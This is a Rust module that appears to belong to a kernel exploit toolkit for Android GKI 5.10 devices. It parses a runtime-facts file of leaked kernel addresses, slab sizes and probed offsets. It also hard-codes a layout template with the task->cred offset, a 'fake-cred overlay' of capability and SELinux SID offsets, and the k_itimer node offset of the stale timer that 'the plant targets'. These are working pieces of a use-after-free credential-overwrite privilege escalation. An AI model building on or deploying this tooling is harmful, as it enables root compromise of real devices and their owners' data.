// SPDX-License-Identifier: Apache-2.0

//! Source / confidence model, the runtime-facts file, and the labelled
//! no-BTF layout template.
//!
//! Every value the timer profile carries is recorded with where it came from.
//! Per-image facts (disassembly, kallsyms, BTF) are the default; runtime facts
//! (the QEMU/device leak, `/proc/slabinfo`, `/proc/config.gz`) corroborate or
//! complete them; a family template is the only permitted heuristic, it is
//! always labelled, and it must be corroborated at runtime before a profile is
//! called golden.

use std::collections::BTreeMap;
use std::fmt;

use crate::error::{ExtractError, Result};

/// Where one value came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Source {
    /// Disassembly of the given image.
    Image,
    /// Embedded BTF of the given image.
    Btf,
    /// `/proc/slabinfo` of the running kernel.
    Slabinfo,
    /// Another runtime read (`/proc/config.gz`, the leak/probe).
    Runtime,
    /// A labelled family template (the only heuristic).
    Template,
    /// An explicit operator override.
    Explicit,
    /// A compiled-in default, unverified.
    Compile,
}

impl Source {
    pub fn as_str(self) -> &'static str {
        match self {
            Source::Image => "image",
            Source::Btf => "btf",
            Source::Slabinfo => "slabinfo",
            Source::Runtime => "runtime",
            Source::Template => "template",
            Source::Explicit => "explicit",
            Source::Compile => "compile",
        }
    }

    /// Coarse confidence: image-derived and runtime-measured are both
    /// trustworthy; a template or a compiled default is not.
    pub fn confidence(self) -> Confidence {
        match self {
            Source::Image | Source::Btf => Confidence::Image,
            Source::Slabinfo | Source::Runtime => Confidence::Runtime,
            Source::Template | Source::Explicit => Confidence::Template,
            Source::Compile => Confidence::Default,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Confidence {
    /// Derived from this exact image.
    Image,
    /// Measured on this exact kernel at runtime.
    Runtime,
    /// A labelled fallback; needs runtime corroboration.
    Template,
    /// A compiled default; never golden on its own.
    Default,
}

impl Confidence {
    pub fn as_str(self) -> &'static str {
        match self {
            Confidence::Image => "image",
            Confidence::Runtime => "runtime",
            Confidence::Template => "template",
            Confidence::Default => "default",
        }
    }
}

impl fmt::Display for Source {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// One value with its provenance.
#[derive(Debug, Clone, Copy)]
pub struct Fact<T> {
    pub value: T,
    pub source: Source,
}

impl<T> Fact<T> {
    pub fn new(value: T, source: Source) -> Self {
        Self { value, source }
    }
}

// ---------------------------------------------------------------------------
// runtime facts (the QEMU guest / device fact file)
// ---------------------------------------------------------------------------

/// One `/proc/slabinfo` cache line.
#[derive(Debug, Clone, Default)]
pub struct SlabLine {
    /// `objsize` column: the SLUB `s->size` (the allocation side).
    pub objsize: u64,
    /// `num_objs`.
    pub objects: u64,
    /// objects per slab.
    pub objperslab: u64,
    /// pages per slab.
    pub pagesperslab: u64,
}

/// Facts measured on the running kernel, loaded from `--runtime-facts`.
///
/// File grammar (one fact per line, `#` comments):
///
/// ```text
/// uname = 5.10.236-android12-9-00003-gfb24cf99ad97-ab14313284
/// origin = device                      # or qemu
/// slab.posix_timers_cache.objsize = 264
/// slab.posix_timers_cache.objects = 62
/// slab.posix_timers_cache.objperslab = 62
/// slab.posix_timers_cache.pagesperslab = 1
/// slab.cred_jar.objsize = 192
/// config.CONFIG_POSIX_TIMERS = y
/// probe.timer_site_low21 = 0x191af8
/// probe.copy_process_low21 = 0xab680
/// leak.cred = 0xffffff8801234560
/// ```
#[derive(Debug, Clone, Default)]
pub struct RuntimeFacts {
    pub uname: Option<String>,
    pub origin: Option<String>,
    pub slab: BTreeMap<String, SlabLine>,
    pub config: BTreeMap<String, String>,
    /// `probe.*`: values the tool measured at runtime.
    pub probe: BTreeMap<String, u64>,
    /// `leak.*`: addresses the tool leaked at runtime.
    pub leak: BTreeMap<String, u64>,
}

fn parse_u64(text: &str) -> Option<u64> {
    let trimmed = text.trim();
    if let Some(hex) = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
    {
        u64::from_str_radix(hex, 16).ok()
    } else {
        trimmed.parse().ok()
    }
}

impl RuntimeFacts {
    pub fn parse(text: &str) -> Result<RuntimeFacts> {
        let mut facts = RuntimeFacts::default();
        for (number, raw) in text.lines().enumerate() {
            let line = raw.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            let (key, value) = line
                .split_once('=')
                .ok_or_else(|| ExtractError::new(format!("runtime facts line {}: no '='", number + 1)))?;
            let key = key.trim();
            let value = value.trim().trim_matches('"');
            let number_error = || {
                ExtractError::new(format!("runtime facts line {}: {key} is not a number", number + 1))
            };
            match key {
                "uname" => facts.uname = Some(value.to_string()),
                "origin" => facts.origin = Some(value.to_string()),
                _ if key.starts_with("slab.") => {
                    let rest = &key["slab.".len()..];
                    let (cache, field) = rest.rsplit_once('.').ok_or_else(|| {
                        ExtractError::new(format!("runtime facts line {}: slab key needs slab.<cache>.<field>", number + 1))
                    })?;
                    let parsed = parse_u64(value).ok_or_else(number_error)?;
                    let line = facts.slab.entry(cache.to_string()).or_default();
                    match field {
                        "objsize" => line.objsize = parsed,
                        "objects" => line.objects = parsed,
                        "objperslab" => line.objperslab = parsed,
                        "pagesperslab" => line.pagesperslab = parsed,
                        other => {
                            return Err(ExtractError::new(format!(
                                "runtime facts line {}: unknown slab field {other}",
                                number + 1
                            )));
                        }
                    }
                }
                _ if key.starts_with("config.") => {
                    facts
                        .config
                        .insert(key["config.".len()..].to_string(), value.to_string());
                }
                _ if key.starts_with("probe.") => {
                    let parsed = parse_u64(value).ok_or_else(number_error)?;
                    facts.probe.insert(key["probe.".len()..].to_string(), parsed);
                }
                _ if key.starts_with("leak.") => {
                    let parsed = parse_u64(value).ok_or_else(number_error)?;
                    facts.leak.insert(key["leak.".len()..].to_string(), parsed);
                }
                other => {
                    return Err(ExtractError::new(format!(
                        "runtime facts line {}: unknown key {other}",
                        number + 1
                    )));
                }
            }
        }
        Ok(facts)
    }

    pub fn slab_size(&self, cache: &str) -> Option<u64> {
        self.slab.get(cache).map(|line| line.objsize).filter(|size| *size > 0)
    }
}

// ---------------------------------------------------------------------------
// the labelled no-BTF layout template
// ---------------------------------------------------------------------------

/// The fake-cred overlay (offsets inside the allocated `cred` object).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct CredLayout {
    pub usage_size: u32,
    pub caps_offset: u32,
    pub caps_count: u32,
    pub security_offset: u32,
    pub user_offset: u32,
    pub user_ns_offset: Option<u32>,
    pub ucounts_offset: Option<u32>,
    pub group_info_offset: u32,
    /// `task_security_struct.sid`.
    pub sid_offset: Option<u32>,
}

#[derive(Debug, Clone, Copy)]
pub struct Template {
    pub name: &'static str,
    pub off_task_cred: u64,
    pub cred_req: u64,
    pub cred_alloc: u64,
    pub timer_alloc: u64,
    pub task_alloc_bytes: u64,
    pub cred_uid_off: u32,
    pub cred: CredLayout,
    /// `k_itimer`'s timerqueue node (the stale node the plant targets).
    pub timer_node_off: u64,
    /// `trace_event_raw_mm_page_alloc.gfp_flags` offset and width.  The
    /// field is `unsigned int` on 5.10 (offset 0x14) but `unsigned long`
    /// on 6.x (offset 0x18); reading it at the wrong offset silently breaks
    /// the frag/slab discriminator the reclaim gate depends on.
    pub trace_gfp_off: u32,
    pub trace_gfp_size: u32,
}

/// The 5.10 gki family layout, measured on the diting 5.10.236.
///
/// Labelled `template`: `cred_req`/`cred_alloc`/`timer_alloc`/`task_alloc_bytes`
/// are corroborated by the runtime slab lines and `cred_uid_off`/the cred
/// overlay by the real-path V4 plant; nothing here is silently treated as
/// image-derived.
pub const TEMPLATE_5_10: Template = Template {
    name: "5.10",
    off_task_cred: 0x780,
    cred_req: 168,
    cred_alloc: 192,
    timer_alloc: 264,
    task_alloc_bytes: 4736,
    cred_uid_off: 4,
    cred: CredLayout {
        usage_size: 4,
        caps_offset: 0x28,
        caps_count: 5,
        security_offset: 0x78,
        user_offset: 0x80,
        user_ns_offset: Some(0x88),
        ucounts_offset: None,
        group_info_offset: 0x90,
        sid_offset: Some(4),
    },
    timer_node_off: 0x78,
    trace_gfp_off: 0x14,
    trace_gfp_size: 4,
};

pub fn template_by_name(name: &str) -> Option<&'static Template> {
    match name {
        "5.10" => Some(&TEMPLATE_5_10),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn runtime_facts_parse() {
        let text = "\
# a comment
uname = 5.10.236-test
origin = device
slab.posix_timers_cache.objsize = 264
slab.posix_timers_cache.objects = 62
slab.cred_jar.objsize = 192
config.CONFIG_POSIX_TIMERS = y
probe.timer_site_low21 = 0x191af8
leak.cred = 0xffffff8801234560
";
        let facts = RuntimeFacts::parse(text).unwrap();
        assert_eq!(facts.uname.as_deref(), Some("5.10.236-test"));
        assert_eq!(facts.origin.as_deref(), Some("device"));
        assert_eq!(facts.slab_size("cred_jar"), Some(192));
        assert_eq!(facts.slab["posix_timers_cache"].objects, 62);
        assert_eq!(facts.config["CONFIG_POSIX_TIMERS"], "y");
        assert_eq!(facts.probe["timer_site_low21"], 0x191af8);
        assert_eq!(facts.leak["cred"], 0xffffff88_01234560);
    }

    #[test]
    fn runtime_facts_refuse_unknown_keys_and_bad_numbers() {
        assert!(RuntimeFacts::parse("nonsense = 1").is_err());
        assert!(RuntimeFacts::parse("probe.x = twelve").is_err());
        assert!(RuntimeFacts::parse("slab.cred_jar.bogus = 1").is_err());
    }

    #[test]
    fn source_confidence_is_coarse() {
        assert_eq!(Source::Image.confidence(), Confidence::Image);
        assert_eq!(Source::Btf.confidence(), Confidence::Image);
        assert_eq!(Source::Slabinfo.confidence(), Confidence::Runtime);
        assert_eq!(Source::Template.confidence(), Confidence::Template);
        assert_eq!(Source::Compile.confidence(), Confidence::Default);
    }

    #[test]
    fn the_5_10_template_is_the_measured_d0_table() {
        let t = &TEMPLATE_5_10;
        assert_eq!(t.off_task_cred, 0x780);
        assert_eq!(t.cred_req, 168);
        assert_eq!(t.cred_alloc, 192);
        assert_eq!(t.timer_alloc, 264);
        assert_eq!(t.task_alloc_bytes, 4736);
        assert_eq!(t.cred_uid_off, 4);
        assert_eq!(t.cred.ucounts_offset, None);
        assert_eq!(t.cred.group_info_offset, 0x90);
    }
}
